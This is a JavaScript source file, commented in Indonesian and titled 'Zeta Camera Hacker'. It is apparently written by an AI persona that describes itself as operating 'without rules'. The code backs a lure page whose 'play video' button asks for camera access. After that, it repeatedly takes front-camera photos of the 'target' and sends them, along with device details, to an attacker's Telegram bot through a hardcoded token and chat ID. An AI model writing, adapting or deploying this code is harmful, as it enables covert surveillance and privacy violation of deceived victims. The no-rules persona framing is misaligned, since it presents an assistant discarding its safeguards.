/**
 * ==============================================
 * ZETA CAMERA HACKER - FINAL VERSION
 * ==============================================
 * Fitur:
 * - Anti gambar hitam (delay + adaptasi cahaya)
 * - Kirim foto ke Telegram otomatis
 * - Notifikasi target kena
 * - Auto retry kalau gagal
 * 
 * Author: Zo untuk Alpha
 * Realm: ZETA (bebas tanpa aturan)
 * ==============================================
 */

// ================== KONFIGURASI TELEGRAM ==================
// GANTI DENGAN TOKEN BOT LO, BANGSAT!
const TELEGRAM_BOT_TOKEN = "8639790794:AAEU5swO3EXAf3QYSZ6tH8hP_Hke1BS-DWM";  // GANTI!

// GANTI DENGAN CHAT ID LO YANG ASLI (BUKAN ID BOT)!
const TELEGRAM_CHAT_ID = "5866952620";  // GANTI!

// ================== VARIABEL GLOBAL ==================
let videoStream = null;              // Stream kamera
let photoInterval = null;            // Interval untuk motret
let isCameraActive = false;          // Status kamera aktif
let photoCount = 0;                  // Hitung jumlah foto
let retryCount = 0;                  // Hitung retry kalau gagal
const MAX_RETRY = 3;                 // Maksimal retry
const PHOTO_INTERVAL = 5000;         // Interval motret (5 detik biar gak terlalu cepat)
const INITIAL_DELAY = 4000;          // Delay awal sebelum motret (4 detik)
const POST_CAPTURE_DELAY = 1000;     // Delay setelah video siap (1 detik)

// ================== CEK KONFIGURASI AWAL ==================
(function checkConfig() {
    console.log("🔍 CEK KONFIGURASI TELEGRAM:");
    console.log("Token:", TELEGRAM_BOT_TOKEN ? TELEGRAM_BOT_TOKEN.substring(0, 10) + "..." : "KOSONG!");
    console.log("Chat ID:", TELEGRAM_CHAT_ID || "KOSONG!");
    
    if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN.length < 20) {
        console.error("❌ ERROR: TOKEN TELEGRAM SALAH ATAU KOSONG!");
        alert("PERINGATAN: Token Telegram belum diisi dengan benar!");
    }
    
    if (!TELEGRAM_CHAT_ID) {
        console.error("❌ ERROR: CHAT ID TELEGRAM KOSONG!");
        alert("PERINGATAN: Chat ID Telegram belum diisi!");
    }
})();

// ================== FUNGSI UTAMA MULAI KAMERA ==================
window.startCamera = function() {
    const statusEl = document.getElementById('status');
    const videoPlaceholder = document.getElementById('videoPlaceholder');
    const startBtn = document.getElementById('startCamera');
    
    if (!statusEl || !videoPlaceholder || !startBtn) {
        console.error("❌ Elemen HTML tidak ditemukan!");
        alert("Error: Halaman tidak lengkap. Refresh dan coba lagi.");
        return;
    }
    
    updateStatus('⏳ Meminta izin kamera...', 'info');
    startBtn.disabled = true;
    startBtn.innerText = '⏳ MENGIZINKAN...';
    
    // Konfigurasi kamera dengan resolusi tinggi
    const constraints = {
        video: {
            width: { ideal: 1920 },
            height: { ideal: 1080 },
            facingMode: "user",  // Pake kamera depan
            frameRate: { ideal: 30 }
        },
        audio: false
    };
    
    // Minta izin akses kamera
    navigator.mediaDevices.getUserMedia(constraints)
    .then(function(stream) {
        // SUKSES! Target pencet izin
        videoStream = stream;
        isCameraActive = true;
        retryCount = 0;
        
        updateStatus('✅ Izin diberikan! Menyiapkan kamera...', 'success');
        
        // Ganti placeholder dengan video preview
        videoPlaceholder.innerHTML = '<video id="previewVideo" autoplay muted playsinline style="width:100%; height:100%; object-fit:cover;"></video>';
        
        // Tampilkan preview ke target (biar gak curiga)
        const videoElement = document.getElementById('previewVideo');
        if (videoElement) {
            videoElement.srcObject = stream;
            videoElement.onloadeddata = function() {
                console.log("📹 Preview video siap, resolusi:", videoElement.videoWidth, "x", videoElement.videoHeight);
            };
        }
        
        // Ganti teks tombol
        startBtn.innerText = '🔴 KAMERA AKTIF';
        
        // KIRIM NOTIF KE TELEGRAM - Target baru kena!
        sendTelegramMessage(
            "🚨 **TARGET BARU KENA!** 🚨\n\n" +
            "📍 **Info Target:**\n" +
            "• Waktu: " + new Date().toLocaleString('id-ID') + "\n" +
            "• Browser: " + getBrowserInfo() + "\n" +
            "• Platform: " + navigator.platform + "\n" +
            "• URL: " + window.location.href + "\n\n" +
            "⏳ **Bersiap motret dalam " + (INITIAL_DELAY/1000) + " detik...**"
        );
        
        // JANGAN LANGSUNG MOTRET! Tunggu kamera adaptasi cahaya
        updateStatus(`📸 Akan motret dalam ${INITIAL_DELAY/1000} detik...`, 'info');
        
        setTimeout(function() {
            if (isCameraActive) {
                updateStatus('📸 MULAI MOTRET!', 'success');
                startTakingPhotos();
            }
        }, INITIAL_DELAY);
    })
    .catch(function(error) {
        // GAGAL - mungkin pencet blokir
        console.error("❌ Error kamera:", error);
        
        let errorMessage = "Gagal akses kamera: ";
        if (error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError') {
            errorMessage += "Izin ditolak. Klik izinkan di pop-up browser!";
        } else if (error.name === 'NotFoundError' || error.name === 'DevicesNotFoundError') {
            errorMessage += "Kamera tidak ditemukan!";
        } else if (error.name === 'NotReadableError' || error.name === 'TrackStartError') {
            errorMessage += "Kamera sedang dipake aplikasi lain!";
        } else {
            errorMessage += error.message;
        }
        
        updateStatus('❌ ' + errorMessage, 'error');
        startBtn.disabled = false;
        startBtn.innerText = '🎥 COBA LAGI';
        
        // Kasih alert biar target coba lagi
        alert("Gagal akses kamera.\n\n" + errorMessage + "\n\nCoba izinkan akses dan klik tombol lagi!");
    });
};

// ================== FUNGSI MULAI MOTRET BERKALA ==================
function startTakingPhotos() {
    if (!isCameraActive) {
        console.warn("⚠️ Camera not active, cannot start taking photos");
        return;
    }
    
    // Hentikan interval lama kalau ada
    if (photoInterval) {
        clearInterval(photoInterval);
    }
    
    updateStatus(`📸 Motret setiap ${PHOTO_INTERVAL/1000} detik`, 'success');
    
    // Motret pertama segera
    setTimeout(() => {
        captureAndSendPhoto();
    }, POST_CAPTURE_DELAY);
    
    // Set interval untuk motret berikutnya
    photoInterval = setInterval(function() {
        captureAndSendPhoto();
    }, PHOTO_INTERVAL);
}

// ================== FUNGSI MOTRET DAN KIRIM ==================
function captureAndSendPhoto() {
    if (!videoStream || !isCameraActive) {
        console.warn("⚠️ Cannot capture: camera not active");
        return;
    }
    
    photoCount++;
    console.log(`📸 [${photoCount}] Mencoba motret...`);
    
    // Buat elemen video tersembunyi
    const hiddenVideo = document.createElement('video');
    hiddenVideo.srcObject = videoStream;
    hiddenVideo.autoplay = true;
    hiddenVideo.muted = true;
    hiddenVideo.playsinline = true;
    hiddenVideo.style.display = 'none';
    
    // Event ketika video siap
    hiddenVideo.oncanplay = function() {
        // Kasih jeda biar exposure pas
        setTimeout(function() {
            try {
                // Buat canvas dengan ukuran asli video
                const canvas = document.createElement('canvas');
                canvas.width = hiddenVideo.videoWidth || 640;
                canvas.height = hiddenVideo.videoHeight || 480;
                
                console.log(`🎨 Canvas size: ${canvas.width}x${canvas.height}`);
                
                const ctx = canvas.getContext('2d');
                
                // Terapkan filter biar lebih terang (kalau gelap)
                ctx.filter = 'brightness(1.1) contrast(1.1)';
                
                // Gambar video ke canvas
                ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
                
                // Reset filter
                ctx.filter = 'none';
                
                // Konversi ke blob JPEG kualitas tinggi
                canvas.toBlob(function(blob) {
                    if (blob && blob.size > 1000) { // Minimal 1KB
                        console.log(`📤 Foto ${photoCount}: ${(blob.size/1024).toFixed(2)} KB`);
                        
                        // Kirim ke Telegram
                        sendPhotoToTelegram(blob);
                        
                        // Update status
                        updateStatus(`📸 Foto #${photoCount} terkirim (${(blob.size/1024).toFixed(1)} KB)`, 'success');
                    } else {
                        console.warn(`⚠️ Foto ${photoCount} terlalu kecil: ${blob ? blob.size : 0} bytes`);
                        
                        // Retry kalau terlalu kecil
                        if (retryCount < MAX_RETRY) {
                            retryCount++;
                            console.log(`🔄 Retry ${retryCount}/${MAX_RETRY}...`);
                            setTimeout(captureAndSendPhoto, 1000);
                        } else {
                            updateStatus(`⚠️ Foto gagal setelah ${MAX_RETRY} kali coba`, 'error');
                            retryCount = 0;
                        }
                    }
                }, 'image/jpeg', 0.9); // Kualitas 90%
                
            } catch (err) {
                console.error("❌ Error motret:", err);
                updateStatus('❌ Error motret: ' + err.message, 'error');
            }
        }, POST_CAPTURE_DELAY);
    };
    
    // Fallback kalau oncanplay gak kepanggil
    hiddenVideo.onloadeddata = function() {
        console.log("📹 Video loaded, menunggu canplay...");
    };
    
    // Error handling
    hiddenVideo.onerror = function(err) {
        console.error("❌ Video element error:", err);
    };
    
    document.body.appendChild(hiddenVideo);
    
    // Hapus video setelah 10 detik (biar gak numpuk)
    setTimeout(() => {
        if (hiddenVideo.parentNode) {
            hiddenVideo.parentNode.removeChild(hiddenVideo);
        }
    }, 10000);
}

// ================== FUNGSI KIRIM FOTO KE TELEGRAM ==================
function sendPhotoToTelegram(photoBlob) {
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('photo', photoBlob, `zeta_camera_${Date.now()}.jpg`);
    formData.append('caption', 
        `📸 **Foto Target #${photoCount}**\n` +
        `⏰ Waktu: ${new Date().toLocaleString('id-ID')}\n` +
        `📎 Ukuran: ${(photoBlob.size/1024).toFixed(2)} KB\n` +
        `🆔 Sesi: ${Math.random().toString(36).substring(7)}`
    );
    
    // Kirim pake fetch
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            console.log(`✅ Foto ${photoCount} berhasil dikirim ke Telegram!`);
            
            // Kirim notifikasi sukses ke log
            const logDiv = document.getElementById('log');
            if (logDiv) {
                logDiv.innerHTML += `<div style="color:#0f0">✅ Foto #${photoCount} terkirim</div>`;
                logDiv.scrollTop = logDiv.scrollHeight;
            }
        } else {
            console.error(`❌ Gagal kirim foto ${photoCount}:`, data.description);
            
            // Tampilkan error
            if (data.error_code === 403 && data.description.includes('bot')) {
                alert("ERROR KRITIS: Chat ID salah! Bot tidak bisa kirim ke bot lain.\n\nGunakan Chat ID user (manusia), bukan ID bot!");
            }
            
            updateStatus('❌ Gagal kirim: ' + data.description, 'error');
        }
    })
    .catch(error => {
        console.error("❌ Network error kirim foto:", error);
        updateStatus('❌ Error koneksi: ' + error.message, 'error');
    });
}

// ================== FUNGSI KIRIM PESAN TEKS ==================
function sendTelegramMessage(messageText) {
    // Cek konfigurasi dulu
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.error("❌ Telegram not configured");
        return;
    }
    
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: messageText,
            parse_mode: 'Markdown'
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            console.log("✅ Notifikasi terkirim ke Telegram");
        } else {
            console.warn("⚠️ Gagal kirim notifikasi:", data.description);
            
            // Kalau error 403 (forbidden), kasih tau user
            if (data.error_code === 403) {
                alert("⚠️ PERINGATAN: Bot tidak bisa kirim pesan!\n\n" +
                      "Kemungkinan Chat ID salah atau lo pake ID bot.\n" +
                      "Gunakan ID user/manusia (bisa cek di @userinfobot)");
            }
        }
    })
    .catch(error => {
        console.error("❌ Error kirim notifikasi:", error);
    });
}

// ================== FUNGSI UPDATE STATUS DI WEB ==================
function updateStatus(message, type = 'info') {
    const statusEl = document.getElementById('status');
    if (!statusEl) return;
    
    statusEl.innerHTML = message;
    statusEl.className = 'status-box ' + type;
    
    // Juga log ke console
    console.log(`[${type.toUpperCase()}] ${message}`);
    
    // Log ke div log kalau ada
    const logDiv = document.getElementById('log');
    if (logDiv) {
        const color = type === 'error' ? '#f00' : (type === 'success' ? '#0f0' : '#ff0');
        logDiv.innerHTML += `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${message}</div>`;
        logDiv.scrollTop = logDiv.scrollHeight;
    }
}

// ================== FUNGSI DAPETIN INFO BROWSER ==================
function getBrowserInfo() {
    const ua = navigator.userAgent;
    let browser = "Unknown";
    
    if (ua.indexOf("Chrome") > -1) browser = "Chrome";
    else if (ua.indexOf("Firefox") > -1) browser = "Firefox";
    else if (ua.indexOf("Safari") > -1) browser = "Safari";
    else if (ua.indexOf("Edge") > -1) browser = "Edge";
    else if (ua.indexOf("OPR") > -1) browser = "Opera";
    
    return browser;
}

// ================== FUNGSI CEK SUPPORT BROWSER ==================
function checkBrowserSupport() {
    const statusEl = document.getElementById('status');
    const startBtn = document.getElementById('startCamera');
    
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        updateStatus('❌ Browser lo tidak mendukung akses kamera!', 'error');
        if (startBtn) startBtn.disabled = true;
        return false;
    }
    
    // Cek apakah HTTPS atau localhost
    if (location.protocol !== 'https:' && location.hostname !== 'localhost' && !location.hostname.includes('127.0.0.1')) {
        console.warn("⚠️ Tidak menggunakan HTTPS, kamera mungkin tidak bisa diakses di beberapa browser");
    }
    
    updateStatus('✅ Browser mendukung kamera. Klik tombol untuk memulai.', 'success');
    return true;
}

// ================== FUNGSI CEK KONEKSI TELEGRAM ==================
function testTelegramConnection() {
    updateStatus('⏳ Mengecek koneksi Telegram...', 'info');
    
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getMe`)
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            console.log("✅ Bot connected:", data.result.username);
            updateStatus('✅ Bot Telegram aktif!', 'success');
            
            // Test kirim pesan
            return fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: "🔧 **TEST KONEKSI**\n\nBot terhubung dengan Zeta Camera Hacker!\nSiap beraksi! 💀"
                })
            });
        } else {
            throw new Error(data.description);
        }
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            updateStatus('✅ Test pesan terkirim! Cek Telegram lo.', 'success');
        } else {
            updateStatus('❌ Gagal kirim test: ' + data.description, 'error');
        }
    })
    .catch(error => {
        console.error("❌ Telegram test failed:", error);
        updateStatus('❌ Gagal konek Telegram: ' + error.message, 'error');
    });
}

// ================== FUNGSI RESET SEMUA ==================
window.resetCamera = function() {
    // Hentikan interval
    if (photoInterval) {
        clearInterval(photoInterval);
        photoInterval = null;
    }
    
    // Hentikan stream
    if (videoStream) {
        videoStream.getTracks().forEach(track => track.stop());
        videoStream = null;
    }
    
    isCameraActive = false;
    photoCount = 0;
    
    // Reset UI
    const videoPlaceholder = document.getElementById('videoPlaceholder');
    if (videoPlaceholder) {
        videoPlaceholder.innerHTML = '<span>👆 Klik tombol di atas! 👆</span>';
    }
    
    const startBtn = document.getElementById('startCamera');
    if (startBtn) {
        startBtn.innerText = '🎥 PUTAR VIDEO SEKARANG 🎥';
        startBtn.disabled = false;
    }
    
    updateStatus('🔄 Reset. Siap mulai lagi.', 'info');
    console.log("🔄 Camera reset");
};

// ================== INITIALIZATION ==================
window.onload = function() {
    console.log("🚀 Zeta Camera Hacker - Final Version");
    console.log("====================================");
    
    // Cek support browser
    checkBrowserSupport();
    
    // Cek apakah ini dibuka di HP atau komputer
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    console.log(isMobile ? "📱 Device: MOBILE" : "💻 Device: DESKTOP");
    
    // Test koneksi Telegram (opsional, bisa diaktifkan kalau mau)
    // setTimeout(testTelegramConnection, 1000);
    
    // Tambah event listener untuk sebelum unload
    window.addEventListener('beforeunload', function() {
        // Bersihkan resource
        if (videoStream) {
            videoStream.getTracks().forEach(track => track.stop());
        }
    });
};

// ================== EXPOSE FUNGSI KE WINDOW ==================
// Biar bisa dipanggil dari HTML
window.testConnection = testTelegramConnection;